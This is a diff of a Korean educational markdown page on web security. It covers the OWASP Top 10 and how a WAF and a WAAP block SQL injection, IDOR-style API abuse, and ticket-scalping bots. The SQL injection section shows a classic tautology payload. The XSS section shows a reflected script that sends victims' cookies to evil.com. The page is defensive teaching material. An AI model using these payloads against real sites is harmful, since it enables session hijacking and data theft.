@@ -128,24 +128,22 @@ OWASP(Open Web Application Security Project)에서 발표하는 **가장 심각�
 
 ### 주요 항목 상세
 
-| 순위 | 항목 | 설명 | WAF 방어 |
-| :---: | :--- | :--- | :---: |
-| **A01** | Broken Access Control | 권한 없는 리소스에 대한 비인가 접근 | O |
-| **A02** | Cryptographic Failures | 민감 데이터의 암호화 미흡 | △ |
-| **A03** | Injection (SQLi, XSS 등) | SQL/OS 쿼리에 악성 코드 삽입 | **O** |
-| **A04** | Insecure Design | 설계 단계의 보안 결함 | △ |
-| **A05** | Security Misconfiguration | 불필요한 기능 활성화, 기본 설정 방치 | O |
-| **A06** | Vulnerable Components | 알려진 취약점이 있는 라이브러리 사용 | O |
-| **A07** | Auth & Identification Failures | 인증 우회, 무차별 대입 공격 | **O** |
-| **A08** | Data Integrity Failures | 신뢰할 수 없는 직렬화 | △ |
-| **A09** | Logging & Monitoring Failures | 보안 이벤트 로깅 부재 | O (로깅) |
-| **A10** | SSRF | 서버가 의도치 않은 내부 요청을 수행 | **O** |
-
-> **O** = WAF로 효과적 방어 가능 / **△** = WAF 단독으로는 제한적, 추가 보안 조치 필요
+| 순위 | 항목 | 설명 |
+| :---: | :--- | :--- |
+| **A01** | Broken Access Control | 권한 없는 리소스에 대한 비인가 접근 |
+| **A02** | Cryptographic Failures | 민감 데이터의 암호화 미흡 |
+| **A03** | Injection (SQLi, XSS 등) | SQL/OS 쿼리에 악성 코드 삽입 |
+| **A04** | Insecure Design | 설계 단계의 보안 결함 |
+| **A05** | Security Misconfiguration | 불필요한 기능 활성화, 기본 설정 방치 |
+| **A06** | Vulnerable Components | 알려진 취약점이 있는 라이브러리 사용 |
+| **A07** | Auth & Identification Failures | 인증 우회, 무차별 대입 공격 |
+| **A08** | Data Integrity Failures | 신뢰할 수 없는 직렬화 |
+| **A09** | Logging & Monitoring Failures | 보안 이벤트 로깅 부재 |
+| **A10** | SSRF | 서버가 의도치 않은 내부 요청을 수행 |
 
 ### 대표 공격 예시: SQL Injection
 
-```
+```text
 # 정상 요청
 GET /users?id=123
 
@@ -158,20 +156,9 @@ GET /users?id=123' OR '1'='1' --
       → 조건이 항상 참이 되어 전체 사용자 정보 유출
 ```
 
-```mermaid
-flowchart LR
-    A["공격 요청<br>id=123' OR '1'='1'"] --> WAF{"🛡️ WAF 검사"}
-    WAF -->|"공격 패턴 탐지"| BLOCK["🚫 차단"]
-    WAF -->|"정상 요청"| PASS["✅ 통과"]
-
-    style WAF fill:#e74c3c,color:white,font-weight:bold
-    style BLOCK fill:#95a5a6,color:white
-    style PASS fill:#2ecc71,color:white
-```
-
 ### 대표 공격 예시: XSS (Cross-Site Scripting)
 
-```
+```text
 # Reflected XSS 공격
 GET /search?q=<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
 
@@ -365,6 +352,7 @@ timeline
 ```
 
 ```mermaid
+%%{init: {'theme': 'base', 'themeVariables': {'primaryColor': '#b0b0b0', 'cScale0': '#ff7675', 'cScale1': '#e17055', 'cScale2': '#a29bfe', 'cScale3': '#00b894'}}}%%
 mindmap
   root((**WAAP**))
     (WAF 기능 강화)
@@ -391,6 +379,70 @@ mindmap
 | **API Security** | API 엔드포인트 보호, 스키마 검증 | API 남용, 데이터 유출 |
 | **Bot Management** | 악성 봇 식별 및 차단, 정상 봇 허용 | 스크래핑, 계정 탈취, 매크로 |
 | **DDoS Protection** | L7 계층 DDoS 공격 방어 | HTTP Flood, Slowloris |
+
+### 공격 방어 시나리오: API Security
+
+모바일 쇼핑앱의 API를 악용하여 다른 사용자의 주문 정보를 탈취하는 시나리오입니다.
+
+```mermaid
+sequenceDiagram
+    autonumber
+    participant Attacker as 🔴 해커
+    participant WAAP as 🛡️ WAAP
+    participant API as API 서버
+    participant DB as DB
+
+    Note over Attacker: 자신의 주문번호: 5001
+    Attacker->>WAAP: GET /api/orders/5001 (정상 요청)
+    WAAP->>API: 요청 전달
+    API->>DB: SELECT * FROM orders WHERE id=5001
+    DB-->>API: 주문 정보 반환
+    API-->>Attacker: 본인 주문 정보 (정상)
+
+    Note over Attacker: 다른 사람의 주문번호로 변조
+    Attacker->>WAAP: GET /api/orders/5002 (타인 주문 조회 시도)
+    Note right of WAAP: API 스키마 검증<br>인증 토큰의 사용자 ID와<br>주문 소유자 불일치 탐지!
+    WAAP-->>Attacker: 403 Forbidden (차단)
+
+    Note over Attacker: 대량 조회로 정보 수집 시도
+    Attacker->>WAAP: GET /api/orders/5003, 5004, 5005...
+    Note right of WAAP: API Rate Limit 초과<br>비정상 호출 패턴 탐지!
+    WAAP-->>Attacker: 429 Too Many Requests (차단)
+    Note over WAAP: 해당 IP/토큰 블랙리스트 등록
+```
+
+> **기존 WAF만으로는?** URL과 파라미터 형식이 정상이므로 SQL Injection도 XSS도 아닙니다. 기존 WAF는 통과시킬 수밖에 없지만, **API Security**는 인증 컨텍스트와 호출 패턴까지 분석하여 차단합니다.
+
+### 공격 방어 시나리오: Bot Management
+
+콘서트 티켓 예매 사이트에서 매크로 봇이 좌석을 독점하는 시나리오입니다.
+
+```mermaid
+sequenceDiagram
+    autonumber
+    participant Bot as 🔴 매크로 봇
+    participant User as 👤 일반 사용자
+    participant WAAP as 🛡️ WAAP
+    participant Server as 티켓 서버
+
+    Note over Server: 인기 콘서트 티켓 오픈 (500석)
+
+    Bot->>WAAP: 초당 100건 예매 요청
+    Note right of WAAP: 행위 분석 시작<br>1. 요청 속도: 초당 100건 (비정상)<br>2. 마우스/키보드 이벤트 없음<br>3. 브라우저 핑거프린트 불일치
+    WAAP-->>Bot: CAPTCHA 챌린지 발송
+    Bot->>WAAP: CAPTCHA 응답 실패
+    WAAP-->>Bot: 403 Forbidden (차단)
+
+    User->>WAAP: 예매 페이지 접속
+    Note right of WAAP: 행위 분석<br>1. 정상 브라우징 패턴<br>2. 마우스 움직임 감지<br>3. 유효한 브라우저 핑거프린트
+    WAAP->>Server: 정상 사용자 요청 전달
+    Server-->>User: 좌석 선택 페이지 표시
+    User->>WAAP: 좌석 선택 및 결제 요청
+    WAAP->>Server: 요청 전달
+    Server-->>User: 예매 완료!
+```
+
+> **기존 WAF만으로는?** 봇의 요청은 형식상 완벽한 정상 HTTP 요청입니다. 공격 패턴이 없으므로 기존 WAF는 차단할 근거가 없지만, **Bot Management**는 요청 속도, 브라우저 핑거프린트, 사용자 행위 패턴을 분석하여 봇과 사람을 구별합니다.
 
 ### 왜 WAAP가 필요한가?
 
